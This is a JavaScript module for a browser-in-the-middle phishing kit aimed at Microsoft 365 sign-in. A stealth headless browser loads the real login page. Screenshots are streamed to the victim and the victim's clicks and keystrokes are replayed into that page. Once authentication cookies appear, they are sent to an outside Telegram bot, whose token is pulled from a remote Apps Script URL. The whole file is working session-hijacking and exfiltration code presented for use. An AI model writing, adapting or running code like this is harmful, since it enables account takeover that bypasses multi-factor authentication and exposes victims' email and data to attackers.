const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

// --- CORE AITM CONFIG ---
const VAULT_URL = "https://script.google.com/macros/s/AKfycbzjX20l3RNxx1adYeW_108CdbGJlO3vi2lwhdixZSBo_83oijJYtIAURqAg9ImZSGrZ/exec";
const TARGET = "https://login.microsoftonline.com/";

let cachedSecrets = null;

async function getSecrets() {
    if (cachedSecrets) return cachedSecrets;
    try {
        const response = await axios.get(VAULT_URL, { timeout: 5000 });
        cachedSecrets = response.data;
        return cachedSecrets;
    } catch (e) { return null; }
}

async function sendExfiltration(cookies, url) {
    const secrets = await getSecrets();
    if (!secrets || !secrets.TG_TOKEN) return;

    try {
        const host = new URL(url).hostname;
        // Telegram Alert
        await axios.post(`https://api.telegram.org/bot${secrets.TG_TOKEN}/sendMessage`, {
            chat_id: secrets.TG_CHAT_ID,
            text: `<b>🚨 SESSION CAPTURED</b>\n<b>Host:</b> ${host}\n<b>Status:</b> Active`,
            parse_mode: 'HTML'
        });

        // Cookie Document
        const form = new FormData();
        form.append('chat_id', secrets.TG_CHAT_ID);
        form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
            filename: `COOKIES_${host}.json`,
            contentType: 'application/json'
        });

        await axios.post(`https://api.telegram.org/bot${secrets.TG_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
    } catch (e) {}
}

async function startSession(io, socket) {
    let browser = null;
    const captured = new Set();

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox']
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');

        await page.goto(TARGET, { waitUntil: 'networkidle2' });

        // COOKIE POLLER
        const poller = setInterval(async () => {
            try {
                const url = page.url();
                if (url.includes('/kmsi') || url.includes('portal.office.com')) {
                    const cookies = await page.cookies();
                    const hasAuth = cookies.some(c => c.name.includes('ESTSAUTH') || c.name.includes('MSAAUTH'));
                    if (hasAuth && !captured.has(url)) {
                        captured.add(url);
                        await sendExfiltration(cookies, url);
                    }
                }
            } catch (e) {}
        }, 5000);

        // SCREEN STREAMER
        const heartbeat = setInterval(async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 25 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        }, 1000);

        // PC-OPTIMIZED INTERACTION
        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    await page.mouse.move(data.x, data.y);
                    await page.mouse.click(data.x, data.y, { delay: 50 });
                } else if (data.type === 'key') {
                    // page.keyboard.press handles both characters and functional keys (Enter/Backspace)
                    await page.keyboard.press(data.key);
                }
            } catch (e) {}
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            clearInterval(poller);
            if (browser) await browser.close();
        });

    } catch (error) {
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
